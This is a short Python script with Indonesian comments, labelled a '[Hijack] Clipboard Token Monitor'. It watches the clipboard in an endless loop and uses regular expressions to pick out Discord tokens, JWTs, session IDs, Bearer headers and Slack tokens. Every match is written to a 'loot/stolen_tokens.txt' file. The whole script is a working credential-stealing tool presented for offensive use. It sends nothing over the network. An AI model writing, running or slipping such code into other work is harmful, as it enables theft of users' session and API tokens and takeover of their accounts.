#!/usr/bin/env python3
import time
import re
import os
from datetime import datetime
import pyperclip  # module buat akses clipboard (copy–paste buffer)

# === Setup loot directory and file ===
LOOT_DIR = "loot"  # folder buat nyimpen hasil “temuan” (tokens)
os.makedirs(LOOT_DIR, exist_ok=True)  # auto buat folder kalau belum ada
LOOT_FILE = os.path.join(LOOT_DIR, "stolen_tokens.txt")  # file log token hasil tangkapan

# === Define token regex patterns ===
patterns = {
    "Discord Token": r"[MN][A-Za-z\d]{23,28}\.[\w-]{6}\.[\w-]{27}",  # pola token Discord
    "JWT / Bearer Token": r"eyJ[a-zA-Z0-9-_]+\.[a-zA-Z0-9-_]+\.[a-zA-Z0-9-_]+",  # JSON Web Token
    "Session ID": r"(sessionid|sid|token|auth)=\w{16,128}",  # pola ID session umum
    "OAuth Bearer": r"Bearer\s+[A-Za-z0-9\-_\.=]+",  # pola header Bearer auth
    "Slack Token": r"xox[baprs]-([0-9a-zA-Z-]+)",  # pola token Slack
}

print("📋 [Hijack] Clipboard Token Monitor started. Watching clipboard...")  # info start

def log_token(kind, token):
    # function buat log token ke file
    timestamp = datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S UTC")  # waktu UTC
    with open(LOOT_FILE, "a") as f:  # buka file append
        f.write(f"\n[{timestamp}] [{kind}]\n{token}\n{'-'*40}\n")  # simpan token + waktu
    print(f"[+] Captured {kind} token at {timestamp}")  # tampilkan di console

# === Watcher loop ===
last_clipboard = ""  # buat nyimpen isi clipboard terakhir

try:
    while True:  # loop utama (infinite)
        try:
            clipboard = pyperclip.paste()  # ambil teks dari clipboard
            if clipboard != last_clipboard:  # kalau ada perubahan isi clipboard
                last_clipboard = clipboard
                for kind, pattern in patterns.items():  # cek tiap pola regex
                    match = re.search(pattern, clipboard)
                    if match:  # kalau ada token yang cocok
                        log_token(kind, match.group())  # log token ke file
                        break  # stop setelah satu token ketemu
        except Exception as e:
            print(f"[!] Error: {e}")  # handle error biar loop tetap jalan
        time.sleep(1.5)  # delay 1.5 detik sebelum cek lagi

except KeyboardInterrupt:
    print("\n[!] Stopping clipboard monitor.")  # stop saat user tekan Ctrl+C
